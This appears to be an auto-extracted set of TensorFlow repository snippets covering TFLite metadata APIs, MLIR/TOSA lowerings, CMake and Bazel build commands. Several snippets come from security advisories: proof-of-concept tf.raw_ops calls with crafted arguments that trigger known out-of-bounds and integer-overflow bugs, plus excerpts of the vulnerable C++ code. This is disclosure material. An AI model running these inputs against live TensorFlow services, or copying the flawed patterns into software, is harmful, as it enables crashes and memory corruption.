TITLE: Starting Output Tensor Groups Vector in TFLite Metadata Python
DESCRIPTION: This function is a helper provided by the `flatbuffers` generated code for the TFLite metadata schema. It is used within the process of building a FlatBuffer object to reserve space for a vector of output tensor group metadata. It takes a `builder` object (typically a `flatbuffers.Builder` instance) and `numElems` specifying the expected number of elements in the vector.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SubGraphMetadataStartOutputTensorGroupsVector.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.SubGraphMetadataStartOutputTensorGroupsVector(
    builder, numElems
)
```

----------------------------------------

TITLE: Calculating TFLite Array Size - C++
DESCRIPTION: This C++ function calculates the memory size required for a `TfLiteIntArray` based on the requested number of elements (`size`). The vulnerability exists here: if `size` is sufficiently large, the multiplication `sizeof(dummy.data[0]) * size` can overflow the `int` return type, resulting in a negative size.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-092.md#_snippet_0

LANGUAGE: C++
CODE:
```
int TfLiteIntArrayGetSizeInBytes(int size) {
  static TfLiteIntArray dummy;
  return sizeof(dummy) + sizeof(dummy.data[0]) * size;
}
```

----------------------------------------

TITLE: Triggering BoostedTrees Heap OOB Vulnerability in TensorFlow Python
DESCRIPTION: This Python snippet demonstrates how to trigger the heap out-of-bounds read vulnerability (CVE-2021-37664) in TensorFlow's `tf.raw_ops.BoostedTreesSparseCalculateBestFeatureSplit` raw op. It provides specially crafted, illegal arguments for `stats_summary_indices` which are not properly validated, leading to an out-of-bounds memory access. This requires the TensorFlow library installed.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-137.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

tf.raw_ops.BoostedTreesSparseCalculateBestFeatureSplit(
  node_id_range=[0,10],
  stats_summary_indices=[[1, 2, 3, 0x1000000]],
  stats_summary_values=[1.0],
  stats_summary_shape=[1,1,1,1],
  l1=l2=[1.0],
  tree_complexity=[0.5],
  min_node_weight=[1.0],
  logits_dimension=3,
  split_type='inequality')

```

----------------------------------------

TITLE: Constructing TensorShape from vector in TensorFlow C++
DESCRIPTION: This C++ snippet shows the line in `sparse_tensors_map_ops.cc` where the input `sparse_shape` vector is directly used to construct a `TensorShape` object. This construction invokes the vulnerable legacy constructor that can trigger a `CHECK` if the dimensions lead to overflow.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-012.md#_snippet_1

LANGUAGE: cpp
CODE:
```
    TensorShape tensor_input_shape(input_shape->vec<int64>());
```

----------------------------------------

TITLE: Accessing Ragged Tensor Splits (Vulnerable Code)
DESCRIPTION: This C++ snippet shows the vulnerable code path within the `RaggedTensorToVariant` operation implementation. It accesses the 'splits' vector of a batched ragged tensor assuming it's non-null. If the input ragged tensor is invalid and empty, `batched_ragged.splits` returns a null vector, leading to a null pointer dereference when accessing `splits(0)`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-005.md#_snippet_2

LANGUAGE: c++
CODE:
```
int ragged_rank = batched_ragged.ragged_rank();
auto batched_splits_top_vec = batched_ragged.splits(0).vec<SPLIT_TYPE>();
```

----------------------------------------

TITLE: Lowering tf.Tile to TOSA MLIR
DESCRIPTION: Documents the lowering of the TensorFlow `tf.Tile` operation, which constructs a tensor by repeating the input tensor, to the TOSA dialect's `tosa.TILE` operation. It requires the `multiples` as a constant attribute.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tosa/g3doc/legalization.md#_snippet_45

LANGUAGE: MLIR
CODE:
```
%output = tf.Tile(%input, %multiples)
```

LANGUAGE: MLIR
CODE:
```
%output = tosa.TILE(%input) {multiples=%multiples.as_constant()}
```

----------------------------------------

TITLE: Running HLO Module with Pass Dumping Shell
DESCRIPTION: This command line demonstrates how to execute an HLO module using `run_hlo_module`. It specifies the target platform (CUDA), disables other HLO passes for isolation, provides the HLO file path, and configures the tool to dump the IR output after the `fusion-emitter` pass to a specified directory.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/emitters.md#_snippet_8

LANGUAGE: Shell
CODE:
```
run_hlo_module --platform=CUDA --xla_disable_all_hlo_passes --reference_platform="" /tmp/gelu.hlo --xla_dump_hlo_pass_re=fusion-emitter --xla_dump_to=<some_directory>
```

----------------------------------------

TITLE: Calling tf.raw_ops.Conv3D with Zero-Dimension Filter Tensor (Example 2)
DESCRIPTION: This Python snippet calls the `Conv3D` raw operation in TensorFlow with a zero-dimension filter tensor and an input tensor with a zero trailing dimension. It is included in a security advisory context, potentially highlighting inputs that could trigger issues.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-005.md#_snippet_1

LANGUAGE: python
CODE:
```
import tensorflow as tf

input_tensor = tf.constant([], shape=[2, 2, 2, 2, 0], dtype=tf.float32)
filter_tensor = tf.constant([], shape=[0, 0, 2, 6, 2], dtype=tf.float32)

tf.raw_ops.Conv3D(input=input_tensor, filter=filter_tensor, strides=[1, 56, 39, 34, 1], padding='VALID', data_format='NDHWC', dilations=[1, 1, 1, 1, 1])
```

----------------------------------------

TITLE: Allocating Memory for DLPack Context in TensorFlow C++
DESCRIPTION: This C++ snippet shows the allocation of a `TfDlManagedTensorCtx` object using the `new` operator. This memory allocation occurs early in the `dlpack.to_dlpack` process. If subsequent operations fail without proper error handling and cleanup, this allocated memory is leaked.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2020-024.md#_snippet_1

LANGUAGE: C++
CODE:
```
  auto* tf_dlm_tensor_ctx = new TfDlManagedTensorCtx(tensor_ref);
```

----------------------------------------

TITLE: Parallel Bazel Build Analysis XLA ARM64 CPU (Shell)
DESCRIPTION: Uses the `parallel` command to run a `bazel build` command in parallel for XLA ARM64 CPU targets. It includes tag filters excluding GPU and ARM-specific tests, uses warnings, RBE cross-compile, and non-CCL configurations, and configures output, profiling, and parallelism. It's set to build tests only with `--nobuild`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/build_tools/ci/golden_commands.txt#_snippet_14

LANGUAGE: shell
CODE:
```
parallel --ungroup --retries 3 --delay 15 --nonall -- bazel build --build_tag_filters=-no_oss,-gpu,-requires-gpu-nvidia,-requires-gpu-amd,-not_run:arm --test_tag_filters=-no_oss,-gpu,-requires-gpu-nvidia,-requires-gpu-amd,-not_run:arm --config=warnings --config=rbe_cross_compile_linux_arm64 --config=nonccl --color=yes --test_output=errors --verbose_failures --keep_going --nobuild_tests_only --profile=profile.json.gz --flaky_test_attempts=3 --jobs=150 --bes_upload_mode=fully_async --build_tests_only --nobuild -- //xla/... //build_tools/... @local_tsl//tsl/...
```

----------------------------------------

TITLE: Representing TensorFlow Graph with tfg.graph - MLIR
DESCRIPTION: Shows how the `tfg.graph` operation acts as a container for unordered TensorFlow operations in MLIR. It includes placeholders and operations like AddV2, demonstrating the ability to reference results defined later in the list. This mirrors the structure of TensorFlow's GraphDef.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/ir/README.md#_snippet_4

LANGUAGE: MLIR
CODE:
```
tfg.graph #tfg.version<producer = 42, min_consumer = 33> {
  %arg0, %ctl_0 = tfg.placeholder() : () -> (tensor<*xi32>)
  %add, %ctl_1 = tfg.AddV2(%arg0, %arg1)
                    : (tensor<*xi32>, tensor<*xi32>) -> (tensor<*xi32>)
  %arg1, %ctl_2 = tfg.placeholder() : () -> (tensor<*xi32>)
}
```

----------------------------------------

TITLE: Casting PyObject to EagerTensor C++
DESCRIPTION: This C++ snippet from `pywrap_tensor.cc` shows the `reinterpret_cast` used to convert a `PyObject` pointer `o` to an `EagerTensor` pointer. This cast is unsafe because it assumes the `PyObject` is indeed a valid `EagerTensor` instance, and when it is not (as shown in the Python example), accessing the `handle` member results in reading from an incorrect memory location, causing the vulnerability.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2020-023.md#_snippet_2

LANGUAGE: C++
CODE:
```
TFE_TensorHandle* EagerTensor_Handle(const PyObject* o) {
  return reinterpret_cast<const EagerTensor*>(o)->handle;
}

```

----------------------------------------

TITLE: Initializing TensorMetadataT from Buffer Python
DESCRIPTION: This class method initializes a `TensorMetadataT` object from a FlatBuffers buffer at a specific position. It requires the buffer (`buf`) and the starting position (`pos`) as arguments.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/TensorMetadataT.md#_snippet_1

LANGUAGE: Python
CODE:
```
@classmethod
InitFromBuf(
    buf, pos
)
```

----------------------------------------

TITLE: Example MLIR before Control Dependency Update Pass
DESCRIPTION: This MLIR snippet shows an example function using `tf_executor.graph` and `tf_executor.island` operations before the control dependency update pass is applied. Operations like `ReadVariableOp` and `AssignVariableOp` appear without explicit control dependencies between islands derived from a multi-op original island.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/g3doc/_includes/tf_passes.md#_snippet_23

LANGUAGE: mlir
CODE:
```
    func.func @example(%arg0: tensor<*x!tf_type.resource<tensor<32xf32>>>, %arg1: tensor<32xf32>) -> (tensor<32xf32>) {
      %graph = tf_executor.graph {
        %read0, %read0_control = tf_executor.island wraps "tf.ReadVariableOp"(%arg0) : (tensor<*x!tf_type.resource<tensor<32xf32>>>) -> tensor<32xf32>
        %assign0_control = tf_executor.island wraps "tf.AssignVariableOp"(%arg0, %arg1) : (tensor<*x!tf_type.resource<tensor<32xf32>>>, tensor<32xf32>) -> ()
        %read1, %read1_control = tf_executor.island wraps "tf.ReadVariableOp"(%arg0) : (tensor<*x!tf_type.resource<tensor<32xf32>>>) -> tensor<32xf32>
        %print, %print_control = tf_executor.island wraps "tf.Print"(%read1) { message = "read1 value" } : (tensor<32xf32>) -> (tensor<32xf32>)
        tf_executor.fetch %read1#0 : tensor<32xf32>
      }
      func.return %graph : tensor<32xf32>
    }
```

----------------------------------------

TITLE: Lowering Fake Quant (MLIR/TOSA IR)
DESCRIPTION: Lowers a Fake Quantization operation to TOSA. It calculates the scale and zeropoint based on the input range (min/max), number of bits, and narrow range flag. The operation is implemented by calling helper functions `lower_quantize_op` and `lower_dequantize_op`, effectively simulating quantization and dequantization.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tosa/g3doc/legalization.md#_snippet_9

LANGUAGE: MLIR/TOSA IR
CODE:
```
Value lower_fake_quant_op(Value %inputs, type output_type, float64 min, float64 max,
                            int64 num_bits, bool narrow_range)
{
    assert(num_bits == 8 || num_bits == 16)

    int64 qmax = (1L << (num_bits - 1)) - 1;
    int64 qmin = -(1L << (num_bits - 1))

    if (narrow_range) {
       qmin = qmin + 1
    }

    float64 scale = (max - min) / float64(qmax - qmin)

    int64 zeropoint = (int64)std::round((-min) / scale + float64(qmin))

    %quantized = lower_quantize_op(%inputs.type, %inputs, 1.0 / scale, zeropoint)

    %dequantized = lower_dequantize_op(output_type, %quantized_op, scale, zeropoint)

    return %dequantized
}
```

----------------------------------------

TITLE: Defining Test Executable and Sources (CMake)
DESCRIPTION: Declares the main executable target named `aot_compiled_test`. It lists all the source files (`.cc`) and pre-compiled object files (`.o`) that need to be linked together to form this executable. The object files represent code generated from AOT-compiled TensorFlow graphs.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/pip_package/xla_build/pip_test/CMakeLists.txt#_snippet_4

LANGUAGE: CMake
CODE:
```
add_executable(aot_compiled_test
        aot_compiled_test.cc
        aot_compiled_vars_and_arithmetic.o
        aot_compiled_vars_and_arithmetic_frozen.o
        aot_compiled_x_matmul_y_small.o
        aot_compiled_x_matmul_y_large.o
        aot_compiled_x_matmul_y_large_multithreaded.o
        aot_compiled_x_plus_y.o
        )
```

----------------------------------------

TITLE: Installing Clang 6.0 on Debian 8 - Shell
DESCRIPTION: This shell script provides commands to add the LLVM APT repository for Debian 8 (Jessie), download and add the repository's GPG key, verify the key fingerprint, update the package list, and install the clang and lld packages required for the specialized toolchain. Requires root privileges.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/tools/toolchains/clang6/README.md#_snippet_0

LANGUAGE: sh
CODE:
```
cat >>/etc/apt/sources.list <<'EOF'
deb http://apt.llvm.org/jessie/ llvm-toolchain-jessie main
deb-src http://apt.llvm.org/jessie/ llvm-toolchain-jessie main
EOF
wget -O - https://apt.llvm.org/llvm-snapshot.gpg.key | apt-key add -
apt-key fingerprint |& grep '6084 F3CF 814B 57C1 CF12  EFD5 15CF 4D18 AF4F 7421'
apt-get update
apt-get install clang lld
```

----------------------------------------

TITLE: Modify XLA Source Paths (Shell)
DESCRIPTION: Uses `find` in conjunction with `sed` to recursively locate files within the `openxla/xla` directory and replace internal path references (`@local_xla`, `@local_tsl`). This step is likely part of integrating XLA into the TensorFlow build system by adjusting source file references.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/build_tools/ci/golden_commands.txt#_snippet_6

LANGUAGE: shell
CODE:
```
find $GITHUB_WORKSPACE/openxla/xla -type f -exec sed -i s/@local_xla/@local_xla/g {} +
```

LANGUAGE: shell
CODE:
```
find $GITHUB_WORKSPACE/openxla/xla -type f -exec sed -i s/@local_tsl/@local_tsl/g {} +
```

----------------------------------------

TITLE: Demonstrating Vulnerable Call in TensorFlow Python
DESCRIPTION: This Python snippet demonstrates how to call the `tf.raw_ops.QuantizeAndDequantizeV4Grad` operation with a negative value for the `axis` parameter (`axis=-100`). This specific call triggers the integer overflow vulnerability described in the security advisory (CVE-2021-37645).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-119.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

tf.raw_ops.QuantizeAndDequantizeV4Grad(
  gradients=[1.0,2.0],
  input=[1.0,1.0],
  input_min=[0.0],
  input_max=[10.0],
  axis=-100)
```

----------------------------------------

TITLE: Defining CMake Variable for Target Definitions (CMake)
DESCRIPTION: Sets the CMake variable `LLVM_TARGET_DEFINITIONS` to the value `passes.td`, likely specifying the primary input file for TableGen processing within the LLVM/MLIR build system. This variable is commonly used by subsequent TableGen commands as an implicit input.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/deallocation/transforms/CMakeLists.txt#_snippet_0

LANGUAGE: CMake
CODE:
```
set(LLVM_TARGET_DEFINITIONS passes.td)
```

----------------------------------------

TITLE: Demonstrating Incorrect TensorFlow Shard API Usage - C++
DESCRIPTION: This snippet illustrates an incorrect usage of the TensorFlow `Shard` API where a lambda (`DoWork`) taking `int` arguments is passed. The `Shard` API expects `int64` arguments, leading to integer truncation and the described security vulnerability.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2020-014.md#_snippet_1

LANGUAGE: C++
CODE:
```
    auto DoWork = [samples_per_alpha, num_alphas, &rng, samples_flat,
                   alpha_flat](int start_output, int limit_output) {...};
    Shard(worker_threads.num_threads, worker_threads.workers,
          num_alphas * samples_per_alpha, kElementCost, DoWork);
```

----------------------------------------

TITLE: Lowering Gather Op to TOSA (MLIR)
DESCRIPTION: This function lowers a gather operation, which selects slices from a 'params' tensor using indices from an 'indices' tensor. It calculates dimensions based on batch_dims and axis, prepares permutation vectors, performs transpositions and reshapes on both parameters and indices using TOSA operations, then applies the TOSA GATHER operation, and finally reshapes and transposes the result to the correct output shape.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tosa/g3doc/legalization.md#_snippet_32

LANGUAGE: MLIR
CODE:
```
Value lower_gather_op(Value %params, Value %indices, int32 batch_dims, int32 axis)
{
    assert batch_dims <= %indices.rank;
    assert axis >= batch_dims;

    int32 N = W = K = C = 1;

    for (int32 i = 0; i < batch_dims; i++) N *= %params.shape[i];
    for (int32 i = batch_dims; i < %indices.rank; i++) W *= %indices.shape[i];
    K = %params.shape[axis];
    for (int32 i = batch_dims; i < axis; i++) C *= %params.shape[i];
    for (int32 i = (axis + 1); i < %params.rank; i++) C *= %params.shape[i];

    vector<int32> params_idx_batch, params_idx_left, params_idx_indices, params_idx_right;
    for (int32 i = 0; i < %params.rank; i++) {
        if (i < batch_dims && i < axis)
            params_idx_batch.push_back(i);
        else if (i < axis)
            params_idx_left.push_back(i);
        else if (i < (axis + 1))
            params_idx_indices.push_back(i);
        else
            params_idx_right.push_back(i);
    }

    vector<int32> params_perm = {params_idx_batch, params_idx_left, params_idx_indices, params_idx_right};
    vector<int32> result_perm;
    for (int32 i = 0; i < batch_dims; i++)
        result_perm.push_back(i);
    for (int32 i = 0; i < params_idx_left.size(); i++)
        result_perm.push_back(params_idx_left[i]);
    for (int32 i = batch_dims; i < %indices.rank; i++)
        result_perm.push_back(i);
    for (int32 i = 0; i < params_idx_right.size(); i++)
        result_perm.push_back(params_idx_right[i]);

    %const_params_perm = tosa.CONST() {value=params_perm};
    %const_result_perm = tosa.CONST() {value=result_perm};

    %op1_transpose_params = tosa.TRANSPOSE(%params, %const_params_perm);
    %op2_reshape_op1 = tosa.RESHAPE(%op1_transpose_params) {shape={N,K,C}};
    %op3_reshape_indices = tosa.RESHAPE(%indices) {shape={N,W}};
    %op4_gather_op2_op3 = tosa.GATHER(%op2_reshape_op1, %op3_reshape_indices);
    %op5_reshape_op4 = tosa.RESHAPE(%op4_gather_op2_op3) {shape={N,W,C}};
    %op6_transpose_op5 = tosa.TRANSPOSE(%op5_reshape_op4, %const_result_perm);
}
```

----------------------------------------

TITLE: Pinning Gast Dependency Exactly
DESCRIPTION: The `gast` dependency, used for TensorFlow's AST transformation, is pinned to an exact version (`== 0.4.0`). This ensures stability and predictability for AST processing.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/ci_build/release/requirements_common.txt#_snippet_2

LANGUAGE: Python
CODE:
```
gast == 0.4.0
```

----------------------------------------

TITLE: Packing AudioPropertiesT Object - Python
DESCRIPTION: This instance method packs the current `AudioPropertiesT` object into a provided `builder`. It's used for serializing the object's data into a buffer format, commonly used with libraries like FlatBuffers.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/AudioPropertiesT.md#_snippet_4

LANGUAGE: python
CODE:
```
Pack(
    builder
)

```

----------------------------------------

TITLE: Colocated Resource Variable Read MLIR
DESCRIPTION: Example showing the result of the `-tf-tpu-colocate-composite-resource-ops` pass in MLIR. The original `tf.ReadVariableOp` is wrapped within a `tf_device.launch` operation to ensure it is colocated with the underlying physical TPU device.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/g3doc/_includes/tf_passes.md#_snippet_51

LANGUAGE: mlir
CODE:
```
  %0 = "tf_device.launch"() ( {
    %2 = "tf.ReadVariableOp"(%arg1) : (tensor<*x!tf_type.resource<tensor<4xf32>>>) -> tensor<4xf32>
    tf_device.return %2 : tensor<4xf32>
  }) {...} : () -> tensor<4xf32>
```

----------------------------------------

TITLE: Filtering Sources for Windows Shared Lib CMake
DESCRIPTION: Removes the `simple_memory_arena_debug_dump.cc` source file from the `TFLITE_SRCS` list specifically when building a shared library (`BUILD_SHARED_LIBS`) on the Windows operating system (`CMAKE_SYSTEM_NAME MATCHES "Windows"`).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/CMakeLists.txt#_snippet_22

LANGUAGE: CMake
CODE:
```
if(CMAKE_SYSTEM_NAME MATCHES "Windows" AND BUILD_SHARED_LIBS)
  list(FILTER TFLITE_SRCS EXCLUDE REGEX ".*simple_memory_arena_debug_dump\\.cc$")
endif()
```

----------------------------------------

TITLE: Parallel Bazel Build Analysis TF GPU (Shell)
DESCRIPTION: Uses the `parallel` command to run a `bazel build` command in parallel with specific settings for TensorFlow GPU targets. It includes extensive tag filtering (including GPU tags), uses GPU-specific release and RBE configurations, enables PYWRAP rules, configures output and profiling. The `--nobuild` flag means it checks dependencies and configuration but doesn't perform the actual compilation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/build_tools/ci/golden_commands.txt#_snippet_10

LANGUAGE: shell
CODE:
```
parallel --ungroup --retries 3 --delay 15 --nonall -- bazel build --build_tag_filters=-no_oss,-tf_tosa,-oss_excluded,-oss_serial,-tpu,-benchmark-test,-v1only,-no_gpu,-no_gpu_presubmit,-no_cuda11,+gpu --test_tag_filters=-no_oss,-tf_tosa,-oss_excluded,-oss_serial,-tpu,-benchmark-test,-v1only,-no_gpu,-no_gpu_presubmit,-no_cuda11,+gpu --config=release_gpu_linux --config=rbe_linux_cuda --repo_env=USE_PYWRAP_RULES=True --verbose_failures --test_output=errors --profile=profile.json.gz --test_lang_filters=cc,py --color=yes --nobuild -- //tensorflow/compiler/... -//tensorflow/compiler/tf2tensorrt/... //tensorflow/python/... -//tensorflow/python/distribute/... -//tensorflow/python/kernel_tests/... -//tensorflow/python/data/... -//tensorflow/python/compiler/tensorrt/...
```

----------------------------------------

TITLE: Run Bazel XLA Tests (X86) - Shell
DESCRIPTION: Executes Bazel tests for the TensorFlow XLA component on macOS X86. Similar to the ARM64 configuration, it applies various tag filters, sets build configurations, manages parallelism, handles flaky tests, uploads build results, specifies the macOS minimum OS version, and uses a different test temporary directory.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/build_tools/ci/golden_commands.txt#_snippet_24

LANGUAGE: Shell
CODE:
```
bazel test --build_tag_filters=-no_oss,-gpu,-no_mac,-mac_excluded,-requires-gpu-nvidia,-requires-gpu-amd --test_tag_filters=-no_oss,-gpu,-no_mac,-mac_excluded,-requires-gpu-nvidia,-requires-gpu-amd --config=nonccl --color=yes --test_output=errors --verbose_failures --keep_going --nobuild_tests_only --profile=profile.json.gz --flaky_test_attempts=3 --jobs=150 --bes_upload_mode=fully_async --macos_minimum_os=10.15 --test_tmpdir=/Volumes/BuildData/bazel_output --define=xnn_enable_avxvnniint8=false -- //xla/... -//xla/hlo/experimental/... -//xla/python_api/... -//xla/python/... -//xla/service/gpu/...
```

----------------------------------------

TITLE: Vulnerable RaggedBincount Implementation Logic (C++)
DESCRIPTION: This C++ snippet shows the core logic within the TensorFlow `RaggedBincount` op's implementation that contains the vulnerability. The highlighted code demonstrates how an insufficient check on the `batch_idx` value, due to attacker-controlled `splits`, can lead to an out-of-bounds write when indexing the output tensor `out` with `batch_idx - 1`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-002.md#_snippet_1

LANGUAGE: c++
CODE:
```
    for (int idx = 0; idx < num_values; ++idx) {
      while (idx >= splits(batch_idx)) {
        batch_idx++;
      }
      ...
      if (bin < size) {
        if (binary_output_) {
          out(batch_idx - 1, bin) = T(1);
        } else {
          T value = (weights_size > 0) ? weights(idx) : T(1);
          out(batch_idx - 1, bin) += value;
        }
      }
    }
```

----------------------------------------

TITLE: Listing Flag Definition APIs (C++)
DESCRIPTION: This snippet lists C++ symbols related to flag definitions within TensorFlow, exposed by the `//tensorflow/core/config:flag_defs` build target. It includes references to global flags and methods for accessing exported flags.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/def_file_filter/symbols_pybind.txt#_snippet_5

LANGUAGE: C++
CODE:
```
tensorflow::flags::Global
```

LANGUAGE: C++
CODE:
```
tensorflow::flags::Flags::GetExportedFlag
```

----------------------------------------

TITLE: Merging TensorFlow IfRegion Ops MLIR TensorFlow
DESCRIPTION: Illustrates how the -tf-merge-control-flow pass combines multiple tf.IfRegion operations that share the same predicate into a single tf.IfRegion. The first block shows two separate tf.IfRegion ops, and the second shows the result after merging.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/g3doc/_includes/tf_passes.md#_snippet_33

LANGUAGE: MLIR
CODE:
```
"tf.IfRegion"(%0) ( {
  %2 = "tf.A"() : () -> (tensor<f32>)
  "tf.Yield"() : () -> ()
  }, {
  "tf.Yield"() : () -> ()
 }) { is_stateless = true } : (tensor<i1>) -> ()
"tf.IfRegion"(%0) ( {
  %2 = "tf.B"() : () -> (tensor<f32>)
  "tf.Yield"() : () -> ()
  }, {
  "tf.Yield"() : () -> ()
  }) { is_stateless = true } : (tensor<i1>) -> ()
```

LANGUAGE: MLIR
CODE:
```
"tf.IfRegion"(%0) ( {
  %2 = "tf.A"() : () -> (tensor<f32>)
  %3 = "tf.B"() : () -> (tensor<f32>)
  "tf.Yield"() : () -> ()
  }, {
  "tf.Yield"() : () -> ()
  }) { is_stateless = true } : (tensor<i1>) -> ()
```

----------------------------------------

TITLE: Build Python Dependencies
DESCRIPTION: Lists Python packages necessary for building and packaging the project. Includes tools for interacting with package indexes and core build utilities.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/ci_build/release/requirements_mac.txt#_snippet_1

LANGUAGE: Python Requirements
CODE:
```
twine ~= 3.6.0
setuptools
```

----------------------------------------

TITLE: Installing FFTSG Library CMake
DESCRIPTION: Configures installation rules for the `fft2d_fftsg` target. The library and archive components will be installed to the standard library directory (`CMAKE_INSTALL_LIBDIR`), and public headers will be installed to the standard include directory (`CMAKE_INSTALL_INCLUDEDIR`).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/cmake/modules/fft2d/CMakeLists.txt#_snippet_5

LANGUAGE: CMake
CODE:
```
install(
  TARGETS fft2d_fftsg
  EXPORT tensorflow-liteTargets
  LIBRARY DESTINATION ${CMAKE_INSTALL_LIBDIR}
  ARCHIVE DESTINATION ${CMAKE_INSTALL_LIBDIR}
  PUBLIC_HEADER DESTINATION ${CMAKE_INSTALL_INCLUDEDIR}
)
```

----------------------------------------

TITLE: Defining Audio Properties End Function Signature in TFLite Support (Python)
DESCRIPTION: This snippet shows the Python function signature for `AudioPropertiesEnd`. This function is used within the TFLite metadata schema builder process, likely to finalize or mark the end of defining properties for an audio tensor. It takes a `builder` object as an argument.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/AudioPropertiesEnd.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.AudioPropertiesEnd(
    builder
)
```

----------------------------------------

TITLE: Defining feature Protobuf Library CMake
DESCRIPTION: Marks the generated files as `GENERATED`, defines a static library `feature_proto` using these files, links it against the main `protobuf::libprotobuf` library, and adds the binary directory to its public include paths. This makes the generated Protobuf code available for other targets.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/example/CMakeLists.txt#_snippet_3

LANGUAGE: CMake
CODE:
```
set_source_files_properties(${feature_generated_files} PROPERTIES GENERATED TRUE)
add_library(feature_proto ${feature_generated_files})
target_link_libraries(feature_proto protobuf::libprotobuf)
target_include_directories(feature_proto PUBLIC ${CMAKE_CURRENT_BINARY_DIR})
```

----------------------------------------

TITLE: Listing Op Definition Utility APIs (C++)
DESCRIPTION: This snippet lists C++ symbols for utility functions related to Op definitions, exposed by the `//tensorflow/python/framework:op_def_util_cc` build target. It includes functions for name-to-type conversion, value conversion, and Python object handling.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/def_file_filter/symbols_pybind.txt#_snippet_7

LANGUAGE: C++
CODE:
```
tensorflow::AttributeTypeFromName
```

LANGUAGE: C++
CODE:
```
tensorflow::AttrValueToPyObject
```

LANGUAGE: C++
CODE:
```
tensorflow::ConvertPyObjectToAttributeType
```

LANGUAGE: C++
CODE:
```
tensorflow::DataTypeToPyObject
```

LANGUAGE: C++
CODE:
```
tensorflow::Safe_PyObjectPtr
```

----------------------------------------

TITLE: License Header Python
DESCRIPTION: This block contains the standard Apache 2.0 license header comments, indicating the terms under which the code is provided and may be used.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/audio_classification.ipynb#_snippet_0

LANGUAGE: python
CODE:
```
#@title Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
```

----------------------------------------

TITLE: Executing Traced Restore Function - TensorFlow GraphDef
DESCRIPTION: This node represents a call to another stateful, partitioned function (`__inference__traced_restore_57`), likely implementing the restore logic. It takes the saver filename placeholder and the variable handle as inputs, orchestrating the process of loading saved weights into the variable.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tf2xla/api/v2/testdata/graph_with_flib_def.txt#_snippet_6

LANGUAGE: TensorFlow GraphDef
CODE:
```
node {
  name: "StatefulPartitionedCall_1"
  op: "StatefulPartitionedCall"
  input: "saver_filename"
  input: "Variable"
  attr {
    key: "Tin"
    value {
      list {
        type: DT_STRING
        type: DT_RESOURCE
      }
    }
  }
  attr {
    key: "Tout"
    value {
      list {
        type: DT_STRING
      }
    }
  }
  attr {
    key: "_collective_manager_ids"
    value {
      list {
      }
    }
  }
  attr {
    key: "_output_shapes"
    value {
      list {
        shape {
        }
      }
    }
  }
  attr {
    key: "_read_only_resource_inputs"
    value {
      list {
      }
    }
  }
  attr {
    key: "config_proto"
    value {
      s: "\n\007\n\003CPU\020\001\n\007\n\003GPU\020\0002\002J\0008\001\202\001\000\222\001\002J\000"
    }
